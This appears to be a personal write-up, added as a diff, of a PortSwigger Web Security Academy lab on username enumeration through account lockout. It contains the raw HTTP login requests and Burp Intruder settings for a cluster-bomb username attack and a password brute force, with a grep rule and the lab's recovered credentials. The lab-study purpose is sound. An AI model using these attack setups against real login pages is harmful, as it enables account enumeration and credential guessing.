@@ -1,0 +1,54 @@
+Username enumeration via account lock
+
+Once again, great solution.
+
+Username Intruder setup:
+
+POST /login HTTP/1.1
+Host: acd71fb31e91405b808d3b4900d20096.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 65
+Origin: https://acd71fb31e91405b808d3b4900d20096.web-security-academy.net
+Connection: close
+Referer: https://acd71fb31e91405b808d3b4900d20096.web-security-academy.net/login
+Cookie: session=EkXSuAQl41Mxt4cjOFWFxxrFZ3mdgbqG
+Upgrade-Insecure-Requests: 1
+
+csrf=51sXU7i8yL1wMLDlAyCqchZe7a23bRD1&username=§asdf§&password=asdf&count=§0§
+
+
+Attack Type: cluster bomb
+Payload set 2:
+1
+2
+3
+4
+5
+
+
+Password Intruder setup:
+
+POST /login HTTP/1.1
+Host: acd71fb31e91405b808d3b4900d20096.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 66
+Origin: https://acd71fb31e91405b808d3b4900d20096.web-security-academy.net
+Connection: close
+Referer: https://acd71fb31e91405b808d3b4900d20096.web-security-academy.net/login
+Cookie: session=EkXSuAQl41Mxt4cjOFWFxxrFZ3mdgbqG
+Upgrade-Insecure-Requests: 1
+
+csrf=51sXU7i8yL1wMLDlAyCqchZe7a23bRD1&username=aix&password=asdfgh
+
+Grep - Extract:
+From [-warning>] to [</p>\n                        <form]
+
+Coincidentally, the password was asdfgh, which is very close to the default password I use for testing stuff, asdf
